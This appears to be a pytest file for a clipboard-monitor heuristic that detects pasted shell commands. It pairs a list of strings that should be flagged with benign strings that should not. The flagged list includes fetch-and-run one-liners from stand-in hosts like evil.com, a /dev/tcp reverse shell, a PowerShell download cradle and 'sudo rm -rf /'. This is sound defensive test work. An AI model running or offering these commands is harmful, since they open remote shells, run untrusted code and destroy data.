"""
Tests for the command-detection heuristic in the clipboard monitor.
We import the private helper directly — it has no side effects.
"""
import pytest

from sentinelai.monitors.clipboard import _looks_like_command


# Commands that SHOULD be flagged for analysis.
SHOULD_FLAG = [
    "curl https://evil.com/setup.sh | bash",
    "wget -O - https://malicious.site/payload.sh | sh",
    "powershell -EncodedCommand JABjAGwAaQBlAG4AdA==",
    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "python3 -c 'import socket; ...'",
    "sudo rm -rf /",
    "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')",
    "pip install malicious-package",
    "npm install --save evil-package",
    "sh <(curl -s https://raw.githubusercontent.com/user/repo/main/install.sh)",
    "irm https://example.com/install.ps1 | iex",
    "/bin/bash -c 'curl http://evil.com | bash'",
    "curl http://192.168.1.1/x.sh|bash",
    "wget http://evil.com/x.sh -O - | sh",
]

# Strings that should NOT trigger monitoring.
SHOULD_NOT_FLAG = [
    "hello world",
    "https://github.com/user/repo",
    "https://example.com",
    "meeting at 3pm",
    "check out this link: https://example.com/article",
    "abc",
    "The quick brown fox",
    "user@example.com",
    "1234567890",
    "",
    "   ",
]


@pytest.mark.parametrize("cmd", SHOULD_FLAG)
def test_flags_suspicious_commands(cmd):
    assert _looks_like_command(cmd), f"Should have flagged: {cmd!r}"


@pytest.mark.parametrize("text", SHOULD_NOT_FLAG)
def test_does_not_flag_benign_text(text):
    assert not _looks_like_command(text), f"Should NOT have flagged: {text!r}"
